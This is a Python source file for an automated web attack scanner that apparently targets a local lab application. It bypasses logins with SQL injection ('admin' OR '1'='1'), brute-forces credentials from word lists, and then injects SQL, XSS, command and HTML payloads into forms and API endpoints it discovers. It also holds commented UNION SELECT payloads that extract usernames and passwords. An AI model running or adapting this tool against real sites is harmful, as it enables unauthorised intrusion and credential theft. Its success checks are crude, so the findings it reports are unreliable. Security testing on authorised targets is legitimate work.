import sys
import requests
from bs4 import BeautifulSoup
import platform
import os
import re


def create_session():
    session = requests.Session()
    print("Creating session")
    return session

def parse_input_fields(url, session):
    """
    Parses HTML forms and standalone input tags.
    Returns:
        {
            "forms": [ {...} ],
            "input_tags": [ {...} ]
        }
    """
    headers = {"User-Agent": "Mozilla/5.0"}
    forms = []
    input_tags = []

    try:
        response = session.get(url, headers=headers, timeout=10)
        soup = BeautifulSoup(response.text, "html.parser")

        # --- Parse <form> tags ---
        for form in soup.find_all("form"):
            form_details = {
                "action": form.get("action") or url,
                "method": form.get("method", "get").lower(),
                "inputs": []
            }

            for input_tag in form.find_all("input"):
                input_name = input_tag.get("name") or input_tag.get("id")
                input_type = input_tag.get("type", "text")
                if input_name:
                    form_details["inputs"].append({"name": input_name, "type": input_type})

            if form_details["inputs"]:
                forms.append(form_details)

        # --- Parse standalone <input> fields outside forms ---
        if not forms:
            print(" No <form> tags found. Checking for standalone <input> fields...")

        for input_tag in soup.find_all("input"):
            parent_form = input_tag.find_parent("form")
            if not parent_form:  # Only consider inputs not inside forms
                input_name = input_tag.get("name") or input_tag.get("id")
                input_type = input_tag.get("type", "text")
                if input_name:
                    print(f"[DEBUG] Standalone input detected: {input_name} (type={input_type})")
                    input_tags.append({
                        "name": input_name,
                        "type": input_type,
                        "action": url,
                        "method": "get"
                    })

        return {
            "forms": forms,
            "input_tags": input_tags
        }

    except Exception as e:
        print(f"[-] Error while parsing inputs: {e}")
        return {
            "forms": [],
            "input_tags": []
        }


def load_payloads(vuln_type):
    payloads = []

    base_dir = os.path.dirname(__file__)
    default_file = os.path.join(base_dir, "payload_texts", f"{vuln_type}.txt")
    custom_file  = os.path.join(base_dir, "custom_payloads", f"{vuln_type}_custom.txt")

    if os.path.exists(default_file):
        with open(default_file, "r", encoding="utf-8") as f:
            payloads.extend([line.strip() for line in f if line.strip()])

    if os.path.exists(custom_file):
        print(f"[DEBUG] Using custom payloads from: {custom_file}")
        with open(custom_file, "r", encoding="utf-8") as f:
            payloads.extend([line.strip() for line in f if line.strip()])

    return list(set(payloads))  # Deduplicate



'''sql_payloads = [
                f"' UNION SELECT {', '.join(['sqlite_version()'] + ['NULL'] * (num_cols - 1))} --",
                "' ORDER BY 2 --",
                f"' UNION SELECT {', '.join(['username', 'password'] + ['NULL'] * (num_cols - 2))} FROM users --"
                f"' UNION SELECT {', '.join(['name'] + ['NULL'] * (num_cols - 1))} FROM sqlite_master WHERE type='table' AND name LIKE '%user%' --",
                f"' UNION SELECT {', '.join(['name'] + ['NULL'] * (num_cols - 1))} FROM sqlite_master WHERE type='table' --",
                f"' UNION SELECT {', '.join(['sql'] + ['NULL'] * (num_cols - 1))} FROM sqlite_master WHERE name='users' --",
                "' OR X'61646d696e'='admin' --",
                "' OR 'a' || 'a' = 'aa' --"
            ]'''

def test_sql_injection(base_url, session, is_api=False, api_endpoints=[]):
    results = []
    results.append(" ")
    results.append("=========================== SQL Injection ===========================")

    # Load SQL Injection payloads
    raw_payloads = load_payloads("sql_injection")
    if not raw_payloads:
        results.append("[-] No SQLi payloads found. Check payload_texts/sql_injection.txt")
        return results

    # API Endpoint testing
    if is_api and api_endpoints:
        results.append("\n API Endpoints:")
        for endpoint in api_endpoints:
            results.append(f"\n Endpoint → {endpoint}")
            for payload in raw_payloads:
                try:
                    r = session.get(endpoint, params={"q": payload})
                    if payload in r.text or "error" not in r.text.lower():
                        results.append(f"[+] SQLi likely at {endpoint} → payload: {payload}")
                    else:
                        results.append(f"[-] No SQLi at {endpoint} → {payload}")
                except Exception as e:
                    results.append(f"[!] Error testing {endpoint}: {e}")
        return results

    # Form & Input tag testing
    parsed_inputs = parse_input_fields(base_url, session)
    forms = parsed_inputs["forms"]
    input_tags = parsed_inputs["input_tags"] 
    # === 1. Forms ===
    results.append("\n Forms:")
    for form_index, form in enumerate(forms):
        form_action = form["action"]
        if not form_action:
            form_action = base_url
        elif not form_action.startswith("http"):
            form_action = base_url.rstrip("/") + "/" + form_action.lstrip("/")

        # Determine column count
        num_cols = 0
        for i in range(1, 20):
            test_payload = {
                inp["name"]: f"' ORDER BY {i} --" if inp["type"] == "text" else "test"
                for inp in form["inputs"] if inp["name"]
            }
            try:
                if form["method"] == "post":
                    r = session.post(form_action, data=test_payload)
                else:
                    r = session.get(form_action, params=test_payload)
                if "error" in r.text.lower():
                    num_cols = i - 1
                    break
            except:
                break
        results.append(f"[DEBUG] Columns Detected: {num_cols}")

        sql_payloads = [inject_column_placeholders(p, num_cols) for p in raw_payloads] if num_cols > 0 else raw_payloads

        for input_field in form["inputs"]:
            name = input_field["name"]
            results.append(f"\nForm {form_index + 1} → Input Field '{name}':")
            for payload in sql_payloads:
                data = {
                    inp["name"]: payload if inp["name"] == name and inp["type"] == "text" else "test"
                    for inp in form["inputs"]
                }
                try:
                    if form["method"] == "post":
                        r = session.post(form_action, data=data)
                    else:
                        r = session.get(form_action, params=data)
                    if payload in r.text or "error" not in r.text.lower():
                        results.append(f"[+] SQLi payload successful: {payload}")
                    else:
                        results.append(f"[-] SQLi failed: {payload}")
                except Exception as e:
                    results.append(f"[!] Error testing {payload}: {e}")

    # === 2. Standalone Input Tags ===
    results.append("\n Standalone Input Fields:")
    for input_tag in input_tags:
        name = input_tag["name"]
        results.append(f"\n Standalone Input → Field '{name}':")
        for payload in raw_payloads:
            try:
                r = session.get(base_url, params={name: payload})
                if payload in r.text or "error" not in r.text.lower():
                    results.append(f"[+] SQLi likely → payload: {payload}")
                else:
                    results.append(f"[-] Not vulnerable → {payload}")
            except Exception as e:
                results.append(f"[!] Error testing {name} → {e}")

    return results
def test_xss(base_url, session, is_api=False, api_endpoints=[]):
    results = []
    results.append(" ")
    results.append("=========================== Cross-Site Scripting (XSS) Test Results: ===========================")

    payloads = load_payloads("xss")
    if not payloads:
        results.append("[-] No XSS payloads found. Check payload_texts/xss.txt")
        return results

    # === FORMS and STANDALONE INPUTS ===
    parsed_inputs = parse_input_fields(base_url, session)
    forms = parsed_inputs["forms"]
    input_tags = parsed_inputs["input_tags"] 

    # --- Forms ---
    if forms:
        results.append("\n Forms-Based Inputs:")
        for form_index, form in enumerate(forms):
            form_action = form["action"]
            if not form_action.startswith("http"):
                form_action = base_url.rstrip("/") + "/" + form_action.lstrip("/")

            for input_field in form["inputs"]:
                input_name = input_field["name"]
                input_type = input_field["type"]

                results.append(f"\nForm {form_index + 1} → Input: {input_name}")

                for payload in payloads:
                    data = {
                        field["name"]: (payload if field["name"] == input_name and field["type"] in ["text", "textarea"] else "test")
                        for field in form["inputs"] if field["name"]
                    }

                    try:
                        if form["method"] == "post":
                            r = session.post(form_action, data=data)
                        else:
                            r = session.get(form_action, params=data)

                        if payload in r.text:
                            results.append(f"[+] XSS confirmed with payload: {payload}")
                        else:
                            results.append(f"[-] Payload not executed: {payload}")
                    except Exception as e:
                        results.append(f"[!] Error on input '{input_name}' with payload '{payload}': {e}")

    # --- Standalone Input Tags ---
    if input_tags:
        results.append("\n Standalone Input Tags:")
        for input_field in input_tags:
            field_name = input_field["name"]
            field_type = input_field["type"]

            results.append(f"\n Input Field: {field_name}")

            for payload in payloads:
                params = {field_name: payload if field_type in ["text", "textarea"] else "test"}

                try:
                    r = session.get(base_url, params=params)
                    if payload in r.text:
                        results.append(f"[+] XSS detected on standalone input using payload: {payload}")
                    else:
                        results.append(f"[-] Payload not executed on input: {payload}")
                except Exception as e:
                    results.append(f"[!] Error on input '{field_name}' with payload '{payload}': {e}")

    # === API Endpoints ===
    if is_api and api_endpoints:
        results.append("\n API Endpoint Testing:")
        for endpoint in api_endpoints:
            results.append(f"\n API → {endpoint}")
            for payload in payloads:
                try:
                    r = session.get(endpoint, params={"q": payload})
                    if payload in r.text:
                        results.append(f"[+] XSS likely using payload: {payload}")
                    else:
                        results.append(f"[-] Payload not reflected: {payload}")
                except Exception as e:
                    results.append(f"[!] Error testing {endpoint} with payload {payload}: {e}")

    return results

def test_command_injection(base_url, session, is_api=False, api_endpoints=[]):
    results = []
    results.append(" ")
    results.append("=========================== Command Injection ===========================")

    # Select payload file based on OS
    payload_file = "command_injection_windows" if platform.system().lower() == "windows" else "command_injection_linux"
    raw_payloads = load_payloads(payload_file)

    if not raw_payloads:
        results.append(f"[-] No Command Injection payloads found. Check payload_texts/{payload_file}.txt")
        return results

    print(f"[DEBUG] Loaded {len(raw_payloads)} Command Injection payloads.")

    # Parse command/injection pairs
    payloads = []
    for line in raw_payloads:
        parts = line.split(",", 1)
        if len(parts) == 2:
            command, success_indicator = parts[0].strip(), parts[1].strip()
            payloads.append((command, success_indicator))
        else:
            print(f"[WARNING] Invalid payload format: {line}")

    # === 1. Form-based Testing ===
    parsed_inputs = parse_input_fields(base_url, session)
    forms = parsed_inputs["forms"]
    input_tags = parsed_inputs["input_tags"] 

    results.append("\nForms:")
    for form_index, form in enumerate(forms):
        form_action = form.get("action")

        print("action")
        if not form_action:
            print("not form action")
            form_action = base_url
        elif not form_action.startswith("http"):
            print("elif")
            form_action = base_url.rstrip("/") + "/" + form_action.lstrip("/")

        for input_field in form["inputs"]:
            print("input fields ----------------------")
            input_name = input_field["name"]
            input_type = input_field["type"]
            results.append(f"\n Form {form_index + 1} → Input Field '{input_name}':")
            for command, indicator in payloads:
                data = {
                    inp["name"]: command if inp["name"] == input_name and inp["type"] == "text" else "test"
                    for inp in form["inputs"]
                }
                try:
                    if form["method"] == "post":
                        r = session.post(form_action, data=data)
                    else:
                        r = session.get(form_action, params=data)
                    if indicator in r.text:
                        results.append(f"[+] Command executed → {command}")
                    else:
                        results.append(f"[-] No result for → {command}")
                except Exception as e:
                    results.append(f"[!] Error on payload {command}: {e}")

    # === 2. Standalone Input Fields ===
    results.append("\n Standalone Input Fields:")
    for tag in input_tags:
        if not isinstance(tag, dict):
            results.append(f" Skipping malformed input tag: {tag}")
            continue
        input_name = tag.get("name")
        input_type = tag.get("type", "text")

        if not input_name:
            results.append(" Skipping input tag with no name.")
            continue

        results.append(f"\n Standalone Input → Field '{input_name}':")
        for command, indicator in payloads:
            params = {input_name: command}
            try:
                r = session.get(base_url, params=params)
                if indicator in r.text:
                    results.append(f"[+] Command executed → {command}")
                else:
                    results.append(f"[-] No result for → {command}")
            except Exception as e:
                results.append(f"[!] Error on payload {command}: {e}")
    print("stand alone done ")


    # === 3. API Endpoint Testing ===
    if is_api and api_endpoints:
        results.append("\n API Endpoints:")
        for endpoint in api_endpoints:
            results.append(f"\n Endpoint → {endpoint}")
            for command, indicator in payloads:
                try:
                    r = session.get(endpoint, params={"cmd": command})
                    if indicator in r.text:
                        results.append(f"[+] Command executed → {command}")
                    else:
                        results.append(f"[-] No result for → {command}")
                except Exception as e:
                    results.append(f"[!] Error on endpoint {endpoint}: {e}")

    return results


def test_html_injection(base_url, session, is_api=False, api_endpoints=[]):
    results = []
    results.append(" ")
    results.append("=========================== HTML Injection ===========================")

    # Load payloads
    payloads = load_payloads("html_injection")
    if not payloads:
        results.append("[-] No HTML Injection payloads found.")
        return results

    print(f"[DEBUG] Loaded {len(payloads)} HTML Injection payloads.")

    # === 1. Form-based Testing ===
    parsed_inputs = parse_input_fields(base_url, session)
    forms = parsed_inputs["forms"]
    input_tags = parsed_inputs["input_tags"]    
    results.append("\n Forms:")
    for form_index, form in enumerate(forms):
        if not isinstance(form, dict):
            results.append(f" Skipping malformed form at index {form_index}: {form}")
            continue
        form_action = form.get("action")
        if not form_action:
            form_action = base_url
        elif not form_action.startswith("http"):
            form_action = base_url.rstrip("/") + "/" + form_action.lstrip("/")

        for input_field in form["inputs"]:
            input_name = input_field["name"]
            input_type = input_field["type"]
            results.append(f"\n Form {form_index + 1} → Input Field '{input_name}':")
            for payload in payloads:
                data = {
                    inp["name"]: payload if inp["name"] == input_name and inp["type"] in ["text", "textarea"] else "test"
                    for inp in form["inputs"]
                }
                try:
                    if form["method"] == "post":
                        r = session.post(form_action, data=data)
                    else:
                        r = session.get(form_action, params=data)
                    if payload in r.text:
                        results.append(f"[+] Payload succeeded → {payload}")
                    else:
                        results.append(f"[-] Payload not reflected → {payload}")
                except Exception as e:
                    results.append(f"[!] Error testing payload {payload}: {e}")

    # === 2. Standalone <input> Tags ===
    results.append("\n Standalone Input Fields:")
    for tag in input_tags:
        input_name = tag["name"]
        input_type = tag["type"]
        results.append(f"\n Standalone Input → Field '{input_name}':")
        for payload in payloads:
            params = {input_name: payload}
            try:
                r = session.get(base_url, params=params)
                if payload in r.text:
                    results.append(f"[+] Payload succeeded → {payload}")
                else:
                    results.append(f"[-] Payload not reflected → {payload}")
            except Exception as e:
                results.append(f"[!] Error testing {payload} on input '{input_name}': {e}")

    # === 3. API Endpoint Testing ===
    if is_api and api_endpoints:
        results.append("\n API Endpoints:")
        for endpoint in api_endpoints:
            results.append(f"\n Endpoint → {endpoint}")
            for payload in payloads:
                try:
                    r = session.get(endpoint, params={"query": payload})
                    if payload in r.text:
                        results.append(f"[+] Payload succeeded → {payload}")
                    else:
                        results.append(f"[-] Payload not reflected → {payload}")
                except Exception as e:
                    results.append(f"[!] Error testing endpoint {endpoint} with {payload}: {e}")

    return results


def xss_only(target_url):
    results = []
    session = create_session()

    # Step 1: Perform SQL Injection on the login page
    login_url = "/".join(target_url.split("/")[:3])  # Extract base URL (e.g., http://127.0.0.1:5000)
    results.append(f"[+] Attempting SQL Injection on login page: {login_url}...")
    sql_results = login_sql_injection(login_url, session)

    if any("[+]" in result for result in sql_results):  # Continue only if any SQL Injection result was successful
        results.extend(sql_results)
        results.append(f"[+] Login successful! Proceeding to the target page...")

        results.extend(test_xss(target_url,session))
    return results

def command_only(target_url):
    results = []
    session = create_session()

    # Step 1: Perform SQL Injection on the login page
    login_url = "/".join(target_url.split("/")[:3])  # Extract base URL (e.g., http://127.0.0.1:5000)
    results.append(f"[+] Attempting SQL Injection on login page: {login_url}...")
    sql_results = login_sql_injection(login_url, session)

    if any("[+]" in result for result in sql_results):  # Continue only if any SQL Injection result was successful
        results.extend(sql_results)
        results.append(f"[+] Login successful! Proceeding to the target page...")

        # Use the main Command Injection function to test dynamically
        results.extend(test_command_injection(target_url, session))
    else:
        results.append("[-] SQL Injection failed. Skipping XSS, Command Injection, and HTML Injection tests.")

    return results

def html_only(target_url):
    results = []
    session = create_session()

    # Step 1: Perform SQL Injection on the login page
    login_url = "/".join(target_url.split("/")[:3])  # Extract base URL (e.g., http://127.0.0.1:5000)
    results.append(f"[+] Attempting SQL Injection on login page: {login_url}...")
    sql_results = login_sql_injection(login_url, session)

    if any("[+]" in result for result in sql_results):  # Continue only if any SQL Injection result was successful
        results.extend(sql_results)
        results.append(f"[+] Login successful! Proceeding to the target page...")

        # Use the main Command Injection function to test dynamically
        print("Calling HTML Injection function")
        results.extend(test_html_injection(target_url, session))
    else:
        results.append("[-] SQL Injection failed. Skipping XSS, Command Injection, and HTML Injection tests.")
    return results

def sql_only(target_url):
    results = []
    session = create_session()

    # Step 1: Perform SQL Injection on the login page
    login_url = "/".join(target_url.split("/")[:3])  # Extract base URL (e.g., http://127.0.0.1:5000)
    results.append(f"[+] Attempting SQL Injection on login page: {login_url}...")
    sql_results = login_sql_injection(login_url, session)

    if any("[+]" in result for result in sql_results):  # Continue only if any SQL Injection result was successful
        results.extend(sql_results)
        results.append(f"[+] Login successful! Proceeding to the target page...")

        # Use the main Command Injection function to test dynamically
        results.extend(test_sql_injection(target_url, session))
    else:
        results.append("[-] SQL Injection failed. Skipping XSS, Command Injection, and HTML Injection tests.")
    return results



def login_sql_injection(base_url, session):
    results=[]

    results.append(f" ")
    results.append(f"\n Login Using SQL Injection:")

    if session == None:
        session = create_session()
    parsed_inputs = parse_input_fields(base_url, session)
    forms = parsed_inputs["forms"]
    input_tags = parsed_inputs["input_tags"]  
    for form_index, form in enumerate(forms):
        # Handle missing or empty form action
        form_action = form["action"]
        if not form_action:  # Default to the base URL if action is empty
            #results.append(f"[DEBUG] Form {form_index + 1} has no action. Using base URL as form action.")
            form_action = base_url
        elif not form_action.startswith("http"):  # Handle relative URLs
            form_action = base_url.rstrip("/") + "/" + form_action.lstrip("/")

        results.append(f"[DEBUG] Form action URL: {form_action}")

        # Construct payload for SQL Injection
        payload = {
            input_field["name"]: "admin' OR '1'='1" if input_field["type"] == "text" else "password"
            for input_field in form["inputs"] if input_field["name"]
        }

        try:
            # Send the payload using the appropriate HTTP method
            if form["method"] == "post":
                response = session.post(form_action, data=payload)
            else:
                response = session.get(form_action, params=payload)

            if "Welcome" in response.text or "Dashboard" in response.text:
                results.append("[+] SQL Injection successful!")
            else:
                results.append("[-] SQL Injection failed.")
        except Exception as e:
            results.append(f"[-] Error while testing SQL Injection: {e}")
    return results

def is_login_required(url):
    try:
        r = requests.get(url, timeout=10, verify=False)
        keywords = ["login", "signin", "username", "password", "auth"]
        if any(k in r.text.lower() for k in keywords):
            print(f"[🔐] Login form detected at {url}")
            return True
    except Exception as e:
        print(f"[!] Error checking for login: {e}")
    return False

def brute_force_login(base_url, session):
    login_url = base_url + "/login"  # adjust if different
    
    base_dir = os.path.dirname(os.path.abspath(__file__))
    user_file = os.path.join(base_dir, "usernames.txt")
    pass_file = os.path.join(base_dir, "passwords.txt")

    try:
        with open(user_file, "r") as f:
            usernames = [line.strip() for line in f.readlines()]
        with open(pass_file, "r") as f:
            passwords = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print("[-] Username or password file not found in /web-dashboard/scripts/")
        return None

    for user in usernames:
        for pwd in passwords:
            try:
                r = session.post(login_url, data={"username": user, "password": pwd}, allow_redirects=True, verify=False)
                if "you have logged in as" in r.text.lower() or r.status_code in [200, 302]:
                    print(f"[+] Brute force success → {user}:{pwd}")
                    print(r.text.lower())
                    if user == 'admin' and pwd == "password":
                        print("Response : ", r.text.lower() )

                    return (user, pwd)

            except Exception as e:
                print(f"[!] Error on {user}:{pwd} → {e}")
    return None

def complete_scan(target_url):
    results = []
    results.append(f"=== Vulnerability Scanner ===")

    session = requests.Session()
    # Extract base login URL (e.g., http://127.0.0.1:5000)
    base_url = "/".join(target_url.split("/")[:3])

    #check if login is required using a flag
    if is_login_required(base_url):
        login = False
        print("Login detected — trying SQLi...")
        results.append("Login detected — trying SQLi...")

        sql_results = login_sql_injection(base_url, session)
        results.extend(sql_results)

        if any("[+]" in r for r in sql_results):
            print("[+] SQLi login successful.")
            results.append(" [+] Login successful via SQL Injection! Proceeding to the target page...")
            login = True
        else:
            print("[-] SQLi login failed.")
            results.append(" [-] SQL Injection failed.")
            #trying brute force after failed SQLi
            creds = brute_force_login(base_url, session)
            if creds:
                print(f"[+] Brute-force success: {creds[0]}:{creds[1]}")
                results.append(f" [+] Brute-force success → Username: {creds[0]} | Password: {creds[1]}")
                login = True
            else:
                results.append(" [-] Login failed using both SQLi and brute-force. Skipping further tests.")

        # If login successful → run further vulnerability tests
        if login:
            # Scan for endpoints first
            endpoints = detect_js_api_endpoints(target_url, session)

            # Check if any API endpoints were detected
            if endpoints:
                results.append("[+] API Endpoints found — performing API-based testing only.")
                
                # Test ONLY the API endpoints
                results.extend(test_sql_injection(target_url, session, is_api=True, api_endpoints=endpoints))
                results.extend(test_xss(target_url, session, is_api=True, api_endpoints=endpoints))
                results.extend(test_command_injection(target_url, session, is_api=True, api_endpoints=endpoints))
                results.extend(test_html_injection(target_url, session, is_api=True, api_endpoints=endpoints))

            else:
                results.append("[-] No API endpoints found — performing standard form-based testing.")

                # Test standard forms
                results.extend(test_sql_injection(target_url, session))
                results.extend(test_xss(target_url, session))
                results.extend(test_command_injection(target_url, session))
                results.extend(test_html_injection(target_url, session))
                return results

        #if login failed 
        else:
            print("[-] Access denied — login required but not bypassed.")
            return results # terminate

    #no login required   
    else:
        # Scan for endpoints first
        endpoints = detect_js_api_endpoints(target_url, session)

        # Check if any API endpoints were detected
        if endpoints:
            results.append("[+] API Endpoints found — performing API-based testing only.")
            
            # Test ONLY the API endpoints
            results.extend(test_sql_injection(target_url, session, is_api=True, api_endpoints=endpoints))
            results.extend(test_xss(target_url, session, is_api=True, api_endpoints=endpoints))
            results.extend(test_command_injection(target_url, session, is_api=True, api_endpoints=endpoints))
            results.extend(test_html_injection(target_url, session, is_api=True, api_endpoints=endpoints))

        else:
            results.append("[-] No API endpoints found — performing standard form-based testing.")

            # Test standard forms
            results.extend(test_sql_injection(target_url, session))
            results.extend(test_xss(target_url, session))
            results.extend(test_command_injection(target_url, session))
            results.extend(test_html_injection(target_url, session))


        print("[-] No login required.")
        print(results)
        return results

def inject_column_placeholders(payload, num_cols):
    """
    Replaces <<cols>> or <<cols:N>> with the exact number of NULLs needed to
    make the total number of columns in the SELECT statement equal to `num_cols`.
    This works regardless of where <<cols>> appears in the list.
    """
    if "<<" not in payload:
        return payload

    # Match <<cols>> or <<cols:N>>
    match = re.search(r"<<cols(?::(\d+))?>>", payload)
    if not match:
        return payload

    override = match.group(1)
    placeholder = match.group(0)

    # Case 1: <<cols:N>> — use fixed number of NULLs
    if override:
        null_count = int(override)
        nulls = ", ".join(["NULL"] * null_count)
        return payload.replace(placeholder, nulls)

    # Case 2: <<cols>> — auto calculate how many NULLs needed
    # Replace <<cols>> with temporary marker
    temp_payload = payload.replace(placeholder, "__COLS__")

    # Extract column list (between SELECT and -- or end of string)
    try:
        # Try to isolate column list
        after_select = re.split(r"(?i)\bselect\b", temp_payload, maxsplit=1)[1]
    except IndexError:
        # No SELECT keyword — fallback: use full payload
        after_select = temp_payload

    # Cut off at comment/end
    after_select = re.split(r"--|\n|\)|;", after_select)[0]

    # Count all values in the list (except the __COLS__)
    columns = [c.strip() for c in after_select.split(",")]
    known_values = [c for c in columns if "__COLS__" not in c and c]

    known_count = len(known_values)
    null_count = max(0, num_cols - known_count)

    # Replace with correct number of NULLs
    nulls = ", ".join(["NULL"] * null_count)
    return payload.replace(placeholder, nulls)

def detect_js_api_endpoints(url, session):
    print(" Scanning JavaScript for AJAX/fetch API endpoints...")
    endpoints = set()

    try:
        response = session.get(url)
        soup = BeautifulSoup(response.text, "html.parser")

        # Use your reusable function here
        extracted = extract_js_endpoints_from_scripts(url, soup)
        for ep in extracted:
            if not ep.startswith("http"):
                ep = "/".join(url.split("/")[:3]) + ep if ep.startswith("/") else "/" + ep
            endpoints.add(ep)

        if endpoints:
            print(f"[+] Found potential API endpoints: {endpoints}")
        else:
            print("[-] No AJAX/fetch API endpoints found.")
        return list(endpoints)

    except Exception as e:
        print(f"[-] Error scanning JS endpoints: {e}")
        return []


def extract_js_endpoints_from_scripts(url, soup):
    base_url = "/".join(url.split("/")[:3])
    endpoints = []

    script_tags = soup.find_all("script", src=True)
    for tag in script_tags:
        js_url = tag["src"]
        if not js_url.startswith("http"):
            js_url = base_url + js_url if js_url.startswith("/") else base_url + "/" + js_url
        try:
            js_content = requests.get(js_url, timeout=5).text
            fetch_urls = re.findall(r"fetch\(['\"]([^'\"]+)['\"]", js_content)
            ajax_urls = re.findall(r"url\s*:\s*['\"]([^'\"]+)['\"]", js_content)
            endpoints.extend(fetch_urls + ajax_urls)
        except:
            continue
    return list(set(endpoints))
